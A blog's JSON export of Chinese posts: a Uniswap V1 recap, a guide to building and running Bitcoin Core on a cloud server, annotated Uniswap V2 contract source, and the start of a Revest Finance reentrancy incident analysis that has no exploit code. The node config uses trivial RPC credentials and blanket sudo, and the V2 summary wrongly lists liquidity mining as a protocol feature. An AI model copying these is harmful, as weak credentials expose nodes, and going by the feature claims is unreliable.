的优点\n去中心化交易Uniswap V1 实现了去中心化交易，用户可以直接与智能合约交互进行交易，无需信任任何中介机构。\n\n无需许可任何人都可以通过提供流动性或进行交易来参与 Uniswap，无需注册或身份验证。\n\n无摩擦交易交易不依赖传统的买卖订单簿，而是通过 AMM 模型直接与流动性池进行交互，简化了交易流程，减少了摩擦。\n\n支持 ERC-20 代币Uniswap V1 支持所有 ERC-20 代币，使得它成为一个灵活的去中心化交易平台，支持多种资产之间的交易。\n\n\n总结Uniswap V1 是一个创新的去中心化自动化做市商（AMM）协议，通过智能合约为用户提供了简单、高效且无需许可的交易方式。它的核心优势在于去中心化、简化交易流程、以及流动性提供者通过交易手续费获得奖励。然而，Uniswap V1 也存在一些局限性，例如价格失真和滑点问题，这些问题在后续的版本（如 V2 和 V3）中得到了改进。\nUniswap V1 为去中心化交易所（DEX）和去中心化金融（DeFi）应用的发展奠定了基础，是目前最广泛使用的去中心化交易协议之一。\n","categories":["Uniswap"],"tags":["basement"]},{"title":"从零开始在云服务器上搭建比特币测试区块链-Chapter1","url":"/2024/11/29/BitcoinCore-Build-C1/","content":"Chapter1-从源码编译构建比特币核心节点\n最近在实验课中接触到了这方面的相关教程，但我发现我们老师所发的教程手册中有很多没有提到的内容，所以在这里开了一篇文章来详细介绍一下\n其实在实际操作中遇到最多的是报错&#x2F;运行不能&#x2F;网络错误等问题，这些我看教程里都没有提到，所以我个人进行了一些简单的补充，主要内容还是以原教程为主\n并且由于这部分的内容较多，我将分成几个部分来讲，这篇文章先讲述如何从源码编译构建比特币核心节点\n\n1. 云服务器的获取这一步就没什么好说的，随便找个华为云&#x2F;腾讯云&#x2F;阿里云的服务器就行，可以用免费试用（毕竟只是测试使用），注意云服务器的系统使用linux的ubuntn\n2. 构建Bitcoin Core核心节点(1). 使用git命令行在系统上创建Bitcoin Core源代码的本地副本先使用 sudo apt-get install git 命令在虚拟机上安装git，再git clone一下bitcoin的github仓库地址\ngit clone https://github.com/bitcoin/bitcoin.git\n\n\n这一步经常出现网络差（github通病）拉取失败的报错，可以在github.com前再加上一个gitclone.com解决\n\n\n(2).使用git命令查看并checkout对应的Bitcoin Core版本**克隆仓库完成后进入bitcoin文件夹，可以使用 git tag命令 查看比特币版本信息\n\n我们这里选择v23.0版本进行后续操作\ngit checkout v23.0\n\n通过命令git status来确认当前源代码的版本信息\n(3).配置构建Bitcoin Core系统\n在Ubuntu Linux中配置与编译Bitcoin Core系统前，可以使用apt安装所需的依赖库。\n\nsudo apt-get updatesudo apt-get install autoconfsudo apt-get install libtoolsudo apt-get install makesudo apt-get install gcc sudo apt-get install g++sudo apt-get install libdb-devsudo apt-get install libdb++-devsudo apt-get install aptitudesudo aptitude install libboost-all-devsudo apt-get install zlib1g-devsudo apt-get install libssl-devsudo apt-get install build-essentialsudo apt-get install libminiupnpc-devsudo apt-get install libevent-devsudo apt-get install sqlite sqlite3sudo apt-get install libsqlite3-devsudo apt-get install pkg-config\n\n安装途中会不断弹出是否要继续安装的选项，一直输入Y（yes）就行\n\n使用.&#x2F;autogen.sh脚本生成一组build 脚本来启动build过程\n\n\n以下是一些常用的选项，可以覆盖configure脚本的默认行为： \n–prefix&#x3D;$HOME 这将覆盖生成的可执行文件的默认安装位置（Linux系统默认是&#x2F; usr &#x2F; local &#x2F;）。 可以使用$ HOME将所有内容放在用户的主目录或不同的路径中。 \n–enable-wallet 用于启用钱包功能。\n–disable-wallet 用于禁用钱包功能。 \n–without-bdb 钱包不使用已不推荐使用的Berkeley DB数据库。\n–with-sqlite 钱包使用SQLite数据库。 \n–with-gui&#x3D;no 不要构建图形用户界面，图形界面需要Qt库，只构建服务器和命令行。\n\n输入下面这串命令确认依赖已经全部安装成功\n./configure --with-gui=no --enable-wallet --without-bdb --with-sqlite=yes\n\n*如果一切顺利，configure命令将会以创建可定制的构建脚本结束。这些构建脚本允许编译bitcoind。如果有缺失的库或是错误，configure命令将会以错误信息终止。如果出现了错误，可能是因为缺少库或是有不兼容的库。 重新检查构建文档，确认你已经安装缺失的必备条件，然后运行configure，看看错误是否消失了。*\n\n(4).构建Bitcoin Core系统可执行文件这一步将编译源代码，这个过程根据CPU和内存资源不同，但一般可能需要1个小时完成。在编译的过程中，应该过几秒或是几分钟看一下输出结果。如果出现了问题，会看到错误信息。如果中断了，编译的过程可以在任何时候恢复。\nmake\n\n\n这一步确实要编译很久，根据网络和虚拟机配置不同有较大的差异，耐心等待即可\nsudo make install \n\n上一步完成后，通过sudo make install 命令，安装 bitcoind 可执行文件到Linux系统路径下\n\n最后再检查一下bitcoin是否安装成功\n\n出现这样的提示就是成功了\n（5）运行Bitcoin Core系统节点\n首先用vi编辑器配置一下config\n\n这里配置的时候一直遇到一些小问题，比如无法读取无法写入文件等报错，经过查询后发现可能是权限的限制，我们只需要在每条指令前加上sudo（管理员权限执行） 即可解决\nsudo vi bitcoin.conf\n\n输入这行命令后就会进入vi编辑器 在vi编辑器中按I是进入insert（插入）模式，可以修改conf配置文件的内容，按esc是退出插入模式。我们先进入插入模式粘贴如下的配置信息\nserver=1  # 接收命令行与JSON-RPC访问txindex=1rpcuser = bitcoinrpc #这里填用户名，一般是rootrpcpassword = bitcoinrpc #这里填写你设置的密码\n\n退出编辑模式之后，使用**:wq**退出配置文件\n确认配置文件无误后，使用下面的命令启动比特币主网络全节点\nbitcoind -conf=/data/bitcoin.conf -datadir=/data\n\n\n注意，这一步最好是新开一个tmux会话运行，因为我最开始直接在主控制台中拉取，但是后面信息太多根本停止不了，会直接让小内存的云服务器爆内存（）\n新开tmux会话的命令 tmux new -t bitcoind\n输入这行命令后，在新出现的会话窗口中输入上面的命令，确认拉取成功后按ctrl+b再按d即可回到主终端\n\n\n拉取主网络节点成功后，随时可以输入\nsudo bitcoin-cli -conf=/data/bitcoin.conf stop #停止节点的拉取\n\n\n使用bitcoin-cli命令监视比特币节点的进度和运行状态\nsudo bitcoin-cli -conf=/data/bitcoin.conf getblockchaininfo\n\n\n总结这篇文章中我简单演示了一下在本地（云服务器）拉取比特币主网络，并构建和运行bitcoin core系统的过程，这也是我们做后续操作所需要的前置条件，下篇文章我将给大家演示如何通过命令行调用比特币系统的JSON-RPC API接口\n","categories":["Bitcoin Core"],"tags":["basement"]},{"title":"Uniswap V2核心代码简析","url":"/2024/12/02/Uniswap-V2/","content":"Uniswap V2核心代码简析\n前言：本篇文章我将对Uniswap V2相较于V1的一些升级做出总结，并且根据github上的Uniswap V2源码进行一些中文的注释，注释参考了UniswapV2_Chinese&#x2F;v2-core at master · kpyaoqi&#x2F;UniswapV2_Chinese\n\n(1).Uniswap V2 相较于V1的优势1. 支持任意代币对\nV1 仅支持以 ETH 为中介的交易对（即每个交易对必须包含 ETH），无法直接交换两种 ERC-20 代币。0\nV2 允许任何两种 ERC-20 代币直接交易，不需要通过 ETH 作为中介，这提高了灵活性并减少了交易步骤。\n\n2. 引入了时间加权平均价格（TWAP）\nV1 没有内置的价格预言机制，依赖外部数据源。\nV2 引入了时间加权平均价格（TWAP），可以通过计算一定时间窗口内的价格平均值，作为价格数据的来源。这一功能不仅提供了价格保护，还能减少短期市场波动对价格的影响。\n\n3. 提供闪电交换（Flash Swap）\nV1 没有提供类似功能。\nV2 引入了闪电交换功能，允许用户在交易开始时无需预先提供资金，完成交易后才结算。用户可以通过这种机制进行套利、借贷等操作。\n\n4. 改进的手续费机制\nV1 的手续费为 0.3%，且不可调节。\nV2 依旧保持 0.3% 的手续费，但协议引入了更灵活的机制，允许调整某些方面的费用结构，进一步提升了协议的可扩展性和适应性。\n\n5. 支持更复杂的交易逻辑\nV2 支持通过合约执行更复杂的交易逻辑，比如支持智能合约中的多代币交换、套利等操作，这使得它可以被集成进更多的金融工具和应用。\n\n6. 安全性增强\nV2 引入了更多的安全措施，尤其是防重入攻击机制。关键的合约函数（如 swap、mint 和 burn）都使用了锁（lock）机制，避免了可能的重入攻击。\n还进行了 Gas 优化，减少了不必要的存储读取，提升了交易效率。\n\nV2 的优势总结\n更高的灵活性：支持任意两种 ERC-20 代币交易，取消了 ETH 作为中介的限制。\n价格预言功能：引入了 TWAP，更加安全和稳定的价格获取方式。\n创新的闪电交换：支持用户无需预先资金即可执行复杂的交易逻辑，增加了协议的可用性。\n更强的安全性：防重入攻击和 Gas 优化使得协议在安全性和性能上都有提升。\n更高效的交易：减少了交易成本和复杂性，使交易变得更加高效和用户友好。\n\n\n(2).Uniswap V2的核心特点\nUniswap V2是一种基于以太坊的去中心化交易协议，旨在提供快速、安全、无信任的代币交换服务。它是Uniswap协议的第二个版本，是对第一个版本的改进和升级。\n\nUniswap V2的核心特点包括以下几个方面：\n去中心化交易：Uniswap V2使用智能合约来执行交易，而不需要传统的中心化交易所。这意味着用户可以直接通过他们的以太坊钱包进行交易，无需信任或依赖第三方中介。\n自动化做市商模型：Uniswap V2采用自动化做市商模型，其中流动性提供者可以将资金存入流动性池中，并通过提供资金来帮助形成交易对的市场价格。这种模型使得任何人都可以成为流动性提供者，并从交易手续费中获得奖励。\n常量乘积函数：Uniswap V2使用常量乘积函数作为交易价格计算模型。根据这个函数，交易所需的两种代币的数量乘积在交易前后保持不变，从而决定了交易价格。这种机制可以在没有订单簿的情况下进行交易，并保持相对简单和高效。\nERC-20代币支持：Uniswap V2支持以太坊上的ERC-20代币进行交易。用户可以通过选择不同的代币对进行交易，并且任何人都可以创建新的代币对，只需提供相应的流动性即可。\n流动性挖矿：Uniswap V2引入了流动性挖矿机制，通过奖励流动性提供者来吸引更多的资金注入流动性池。流动性提供者可以获得代币奖励作为对其提供流动性的补偿，如果市场价格剧烈波动，您存入的资金可能面临损失。\n\n\n(3).Uniswap V2源码注解–UniswapV2Factory\n先贴一下源码\n\npragma solidity =0.5.16;import &#x27;./interfaces/IUniswapV2Factory.sol&#x27;;import &#x27;./UniswapV2Pair.sol&#x27;;contract UniswapV2Factory is IUniswapV2Factory &#123;    address public feeTo;    //function feeTo() external view returns (address)：返回收取手续费地址        address public feeToSetter;    //function feeToSetter() external view returns (address)：设置手续费收取地址的权限地址    mapping(address =&gt; mapping(address =&gt; address)) public getPair;     //function getPair(address tokenA, address tokenB) external view returns (address pair)：获取两个token的交易对地址         address[] public allPairs;     //function allPairs(uint) external view returns (address pair)：返回指定位置的交易对地址         event PairCreated(address indexed token0, address indexed token1, address pair, uint);    constructor(address _feeToSetter) public &#123;        feeToSetter = _feeToSetter;    &#125;    function allPairsLength() external view returns (uint) &#123;        return allPairs.length;        //function allPairsLength() external view returns (uint)：返回所有交易对的长度    &#125;    function createPair(address tokenA, address tokenB) external returns (address pair) &#123;    //function createPair(address tokenA, address tokenB) external returns (address pair)：创建两个token的交易对地址        require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;);        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);        require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;);        require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;); // single check is sufficient        bytes memory bytecode = type(UniswapV2Pair).creationCode;        bytes32 salt = keccak256(abi.encodePacked(token0, token1));        assembly &#123;        \t//add(bytecode, 32)：opcode操作码的add方法,将bytecode偏移后32位字节处,因为前32位字节存的是bytecode长度\t\t\t//mload(bytecode)：opcode操作码的方法,获得bytecode长度            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)        &#125;        IUniswapV2Pair(pair).initialize(token0, token1);        getPair[token0][token1] = pair;        getPair[token1][token0] = pair; // populate mapping in the reverse direction        allPairs.push(pair);        emit PairCreated(token0, token1, pair, allPairs.length);    &#125;    function setFeeTo(address _feeTo) external &#123;        require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);        feeTo = _feeTo;        //function setFeeTo(address) external：更改收取手续费地址    &#125;    function setFeeToSetter(address _feeToSetter) external &#123;        require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);        feeToSetter = _feeToSetter;        //function setFeeToSetter(address) external：更改设置手续费收取地址的权限地址    &#125;&#125;\n\n\n上述合约中的每个方法后面都跟上了方法的目的，现在让我们单独来看这段代码\nbytes32 salt = keccak256(abi.encodePacked(token0, token1));//-1bytes memory bytecode = type(UniswapV2Pair).creationCode;//-2assembly &#123;\t//add(bytecode, 32)：opcode操作码的add方法,将bytecode偏移后32位字节处,因为前32位字节存的是bytecode长度\t//mload(bytecode)：opcode操作码的方法,获得bytecode长度\tpair := create2(0, add(bytecode, 32), mload(bytecode), salt)&#125;//-3\n\n\n这段代码使用了 Solidity 的 create2 操作来部署一个智能合约(UniswapV2Pair-交易对合约)，并且采用了 keccak256 哈希函数来生成一个唯一的 salt。salt 是基于 token0 和 token1 这两个代币地址组合生成的。keccak256 是一种常用的加密哈希算法，生成的 32 字节值（bytes32 类型）将作为 create2 操作的盐值。\n\n这一行获取 UniswapV2Pair 合约的 字节码，也就是合约的创建代码。type(UniswapV2Pair).creationCode 获取 UniswapV2Pair 合约的字节码，UniswapV2Pair 是 Uniswap 中定义交易对（pair）的合约。\nbytecode 变量将包含该合约的构造代码（即部署时的合约代码），它将被用来部署新的 UniswapV2Pair 合约。\n\n这一部分使用了 Solidity 中的 低级 assembly 来执行合约的部署。\n\nadd(bytecode, 32)：由于字节码的前 32 字节存储的是字节码的长度，所以 add(bytecode, 32) 将字节码的位置偏移 32 字节，确保我们获得的是字节码本身，而不是字节码长度。\n\nmload(bytecode)：该操作会返回存储在 bytecode 地址中的第一个 32 字节（即字节码的长度）。\n\ncreate2 是一个低级操作码，用来根据 salt 和字节码部署一个新的合约。\n\n\n\n\n\n它的参数如下：\n0：这是部署合约时传递的以太坊余额。这里是 0，意味着不向新合约发送以太坊。\nadd(bytecode, 32)：字节码的地址（偏移了 32 字节）。\nmload(bytecode)：字节码的长度。\nsalt：前面生成的盐值，这里是基于 token0 和 token1 地址计算得到的哈希值。\n\n\n\n\n\ncreate2 的作用是根据提供的字节码和盐值来确定合约地址，从而在部署合约时保证合约地址的唯一性。即通过盐值与字节码计算生成合约地址，并在相同的输入条件下，每次都能部署到相同的地址。\ncreate2 可以避免在多个合约部署过程中产生冲突，特别是在合约地址已知的情况下，可以确保合约地址的可预测性。这在一些 DeFi 协议中非常有用，比如 Uniswap 使用 create2 部署交易对合约（UniswapV2Pair），这样每对代币的交易对合约地址都是唯一且可预测的。\n\nassembly-内联汇编：在 Solidity 源程序中嵌入汇编代码，对 EVM 有更细粒度的控制\n\n\n(4).Uniswap V2源码注解–UniswapV2Pair\n还是先在这里贴一下源码\npragma solidity =0.5.16;import &#x27;./interfaces/IUniswapV2Pair.sol&#x27;;import &#x27;./UniswapV2ERC20.sol&#x27;;import &#x27;./libraries/Math.sol&#x27;;import &#x27;./libraries/UQ112x112.sol&#x27;;import &#x27;./interfaces/IERC20.sol&#x27;;import &#x27;./interfaces/IUniswapV2Factory.sol&#x27;;import &#x27;./interfaces/IUniswapV2Callee.sol&#x27;;contract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 &#123;    using SafeMath  for uint;    using UQ112x112 for uint224;    uint public constant MINIMUM_LIQUIDITY = 10**3;    bytes4 private constant SELECTOR = bytes4(keccak256(bytes(&#x27;transfer(address,uint256)&#x27;)));    address public factory;    address public token0;    address public token1;    uint112 private reserve0;           // uses single storage slot, accessible via getReserves    uint112 private reserve1;           // uses single storage slot, accessible via getReserves    uint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves    uint public price0CumulativeLast;    uint public price1CumulativeLast;    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event    uint private unlocked = 1;    modifier lock() &#123;        require(unlocked == 1, &#x27;UniswapV2: LOCKED&#x27;);        unlocked = 0;        _;        unlocked = 1;    &#125;    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) &#123;        _reserve0 = reserve0;        _reserve1 = reserve1;        _blockTimestampLast = blockTimestampLast;    &#125;    function _safeTransfer(address token, address to, uint value) private &#123;        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));        require(success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))), &#x27;UniswapV2: TRANSFER_FAILED&#x27;);    &#125;    event Mint(address indexed sender, uint amount0, uint amount1);    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);    event Swap(        address indexed sender,        uint amount0In,        uint amount1In,        uint amount0Out,        uint amount1Out,        address indexed to    );    event Sync(uint112 reserve0, uint112 reserve1);    constructor() public &#123;        factory = msg.sender;    &#125;    // called once by the factory at time of deployment    function initialize(address _token0, address _token1) external &#123;        require(msg.sender == factory, &#x27;UniswapV2: FORBIDDEN&#x27;); // sufficient check        token0 = _token0;        token1 = _token1;    &#125;    // update reserves and, on the first call per block, price accumulators    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123;        require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), &#x27;UniswapV2: OVERFLOW&#x27;);        uint32 blockTimestamp = uint32(block.timestamp % 2**32);        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired        if (timeElapsed &gt; 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123;            // * never overflows, and + overflow is desired            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;        &#125;        reserve0 = uint112(balance0);        reserve1 = uint112(balance1);        blockTimestampLast = blockTimestamp;        emit Sync(reserve0, reserve1);    &#125;    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123;        address feeTo = IUniswapV2Factory(factory).feeTo();        feeOn = feeTo != address(0);        uint _kLast = kLast; // gas savings        if (feeOn) &#123;            if (_kLast != 0) &#123;                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));                uint rootKLast = Math.sqrt(_kLast);                if (rootK &gt; rootKLast) &#123;                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));                    uint denominator = rootK.mul(5).add(rootKLast);                    uint liquidity = numerator / denominator;                    if (liquidity &gt; 0) _mint(feeTo, liquidity);                &#125;            &#125;        &#125; else if (_kLast != 0) &#123;            kLast = 0;        &#125;    &#125;    // this low-level function should be called from a contract which performs important safety checks    function mint(address to) external lock returns (uint liquidity) &#123;        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings        uint balance0 = IERC20(token0).balanceOf(address(this));        uint balance1 = IERC20(token1).balanceOf(address(this));        uint amount0 = balance0.sub(_reserve0);        uint amount1 = balance1.sub(_reserve1);        bool feeOn = _mintFee(_reserve0, _reserve1);        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee        if (_totalSupply == 0) &#123;            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens        &#125; else &#123;            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);        &#125;        require(liquidity &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED&#x27;);        _mint(to, liquidity);        _update(balance0, balance1, _reserve0, _reserve1);        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date        emit Mint(msg.sender, amount0, amount1);    &#125;    // this low-level function should be called from a contract which performs important safety checks    function burn(address to) external lock returns (uint amount0, uint amount1) &#123;        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings        address _token0 = token0;                                // gas savings        address _token1 = token1;                                // gas savings        uint balance0 = IERC20(_token0).balanceOf(address(this));        uint balance1 = IERC20(_token1).balanceOf(address(this));        uint liquidity = balanceOf[address(this)];        bool feeOn = _mintFee(_reserve0, _reserve1);        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution        require(amount0 &gt; 0 &amp;&amp; amount1 &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED&#x27;);        _burn(address(this), liquidity);        _safeTransfer(_token0, to, amount0);        _safeTransfer(_token1, to, amount1);        balance0 = IERC20(_token0).balanceOf(address(this));        balance1 = IERC20(_token1).balanceOf(address(this));        _update(balance0, balance1, _reserve0, _reserve1);        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date        emit Burn(msg.sender, amount0, amount1, to);    &#125;    // this low-level function should be called from a contract which performs important safety checks    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123;        require(amount0Out &gt; 0 || amount1Out &gt; 0, &#x27;UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings        require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY&#x27;);        uint balance0;        uint balance1;        &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors        address _token0 = token0;        address _token1 = token1;        require(to != _token0 &amp;&amp; to != _token1, &#x27;UniswapV2: INVALID_TO&#x27;);        if (amount0Out &gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens        if (amount1Out &gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens        if (data.length &gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);        balance0 = IERC20(_token0).balanceOf(address(this));        balance1 = IERC20(_token1).balanceOf(address(this));        &#125;        uint amount0In = balance0 &gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;        uint amount1In = balance1 &gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;        require(amount0In &gt; 0 || amount1In &gt; 0, &#x27;UniswapV2: INSUFFICIENT_INPUT_AMOUNT&#x27;);        &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));        require(balance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(1000**2), &#x27;UniswapV2: K&#x27;);        &#125;        _update(balance0, balance1, _reserve0, _reserve1);        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);    &#125;    // force balances to match reserves    function skim(address to) external lock &#123;        address _token0 = token0; // gas savings        address _token1 = token1; // gas savings        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));    &#125;    // force reserves to match balances    function sync() external lock &#123;        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);    &#125;&#125;\n\n由于源码太长，注释我就单独拆开写了\n\n合约当中比较重要的方法有(lptoken即UniswapV2ERC20):\nfunction permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external：判断签名的有效性\n\nfunction mint(address to) external returns (uint liquidity)：铸造lptoken\n\nfunction burn(address to) external returns (uint amount0, uint amount1)：销毁lptoken退出流动性\n\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external：根据tokenA的数量在交易池中进行兑换tokenB\n\nfunction skim(address to) external：使两个token的余额与储备相等\n\nfunction sync() external：使两个token的储备与余额相匹配\n\nfunction initialize(address, address) external：设置pair地址交易对的两种token\n\n\n[1].permit:(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s)–用于代币授权// ecrecover 函数可以返回与签名者对应的公钥地址address recoveredAddress = ecrecover(digest, v, r, s);// 判断签名者对应的公钥地址与授权地址是否一致require(recoveredAddress != address(0) &amp;&amp; recoveredAddress == owner, &#x27;UniswapV2: INVALID_SIGNATURE&#x27;);_approve(owner, spender, value);\n\n判断数字签名的有效性，如果通过判断即给予授权\n允许用户在不直接调用 approve 方法的情况下，使用签名授权另一个地址 spender 执行代币转移操作。这个方法利用 EIP-2612 标准，允许用户通过签名来批准代币的转移，减少了用户需要在链上交易的次数。\n[2].mint：(address to) lock returns (uint liquidity)–也就是铸造流动性代币// 1.获取储备量：通过 getReserves() 获取当前交易对的两种代币的储备量（_reserve0 和 _reserve1）(uint112 _reserve0, uint112 _reserve1, ) = getReserves();uint balance0 = IERC20(token0).balanceOf(address(this));uint balance1 = IERC20(token1).balanceOf(address(this));uint amount0 = balance0.sub(_reserve0);uint amount1 = balance1.sub(_reserve1);// 2.调用_mintFee方法// 3.添加流动性所获得的lptoken数量(进行添加流动性的两种token的数量*目前lptoken的数量/当前token的储备量--&gt;取较小值)liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);// 4.铸造lptoken函数和更新储备函数_mint(to, liquidity); //调用 _mint() 方法将 LP Token 分配给 to 地址。_update(balance0, balance1, _reserve0, _reserve1);//通过 _update() 更新储备，确保合约内部的代币余额与储备一致\n\n根据两个token在交易对的增量计算出应该铸造lptoken的数量，然后将lptoken铸造给to地址，具有防重入锁lock\n[3].burn：(address to) lock returns (uint amount0, uint amount1)–销毁流动性代币并提取代币// 1.为什么用addres(this)?--&gt;因为获取退出lptoken数量时，是在Route合约中先将lptoken转到当前合约，然后直接获得当前合约lptoken的数量uint liquidity = balanceOf[address(this)];// 2.调用_mintFee方法// 3.使用余额确保按比例分配--&gt;(持有lptoken/总lptoken)*合约中持有token的数量amount0 = liquidity.mul(balance0) / _totalSupply; amount1 = liquidity.mul(balance1) / _totalSupply; // 4.转账两种token并更新储备量_safeTransfer(_token0, to, amount0);_safeTransfer(_token1, to, amount1);balance0 = IERC20(_token0).balanceOf(address(this));balance1 = IERC20(_token1).balanceOf(address(this));_update(balance0, balance1, _reserve0, _reserve1);\n\n功能：\n\n用户销毁 LP Token 后，从流动性池中提取相应数量的两种代币。它是 mint 方法的反操作。\n\n根据lptokne的比例计算出两种token的各自的数量，然后销毁lptoken并将转账两种token给to地址\n\n\n[4].swap：(uint amount0Out, uint amount1Out, address to, bytes calldata data)–进行代币交换// 1.转移代币if (amount0Out &gt; 0) _safeTransfer(_token0, to, amount0Out); if (amount1Out &gt; 0) _safeTransfer(_token1, to, amount1Out); // 2.用于回调合约来实现一些特定的业务逻辑或其他自定义功能(例如：闪电贷....)if (data.length &gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);// 3.确保在交易完成后，资金池的储备量满足 Uniswap V2 中的 K 恒定公式，即 K = _reserve0 * _reserve1// 4.更新储备\n\n功能：进行代币交换，在两个代币之间进行兑换，更新流动性池的储备，并确保符合 恒定积 K（K = reserve0 * reserve1）公式。\n\n在Route合约用户已经将需要兑换的tokenA转入pair合约中，在Route合约中传入需要输出的tokenB的数量和一个data，转移tokenB后判断data长度是否大于零去进行回调合约\n\n直接调用swap方法进行回调合约获得套利，只要套利后满足后续条件即可\n\n\n合约内部调用的方法：\n_update：(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private\n\n// 1.更新priceCumulativeLast，永远不会溢出，+ overflow是理想的price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;// 2.更新储备量reserve0 = uint112(balance0);reserve1 = uint112(balance1);\n\n更新储备方法：四个参数前两个为更新后两个token的储备量，后两个为更新前两个token的储备量\n\n_mintFee：(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn)\n\n// 1.获取收取手续费的地址如果不是零地址并且kLast!=0则继续下面部分// 2.获取上一次交易后和目前交易对中的K值uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));uint rootKLast = Math.sqrt(_kLast);// 3.如果rootK&gt;rootKLastuint numerator = totalSupply.mul(rootK.sub(rootKLast));uint denominator = rootK.mul(5).add(rootKLast);uint liquidity = numerator / denominator;// 4.如果liquidity大于零为收取手续费地址铸造lptoken if (liquidity &gt; 0) _mint(feeTo, liquidity);\n\n收取手续费方法，参数为当前两个token的储备量\n\n感觉仅仅是简析源码就已经写了这么多了，所以对V2的这两个core合约的关系和总结我就留到下篇文章再写了\n\n","categories":["Uniswap"],"tags":["basement"]},{"title":"ERC1155攻击事件分析--Revest Finance","url":"/2024/12/05/ERC1155-Attack-Revest/","content":"ERC-1155-Attack\n Revest Finance的ERC1155被攻击事件是一个值得关注的案例。以下是对该事件的简要分析：\n\nRevest Finance攻击事件分析\nonERC1155Received-reentrancy-attack\n\n基本信息\n时间：2022年3月27日\n\n损失：约200万美元\n\n攻击目标：Revest Finance的以太坊智能合约\n\n信息确认：https://x.com/RevestFinance/status/1507968623792607233\n\n攻击分析信息参考：\n\nhttps://revestfinance.medium.com/revest-protocol-exploit-recovery-plan-b06ca33fbdf5\n\nhttps://zhuanlan.zhihu.com/p/489484717\n\n\n\n\n背景介绍(来自于官方文档翻译)\nRevest Finance是针对DeFi领域的staking的解决方案，用户通过Revest Finance参与任何DeFi的staking，都可以直接创建生成一个NFT（该NFT包含了这个staking仓位的当前以及未来价值）。\n\nRevest Solidity 堆栈是一个复杂的软件系统。Revest.sol 作为所有交易的入口点，负责管理代币锁定，而代币存储由 TokenVault.sol 处理，FNFT（功能化 NFT）的铸造和销毁由 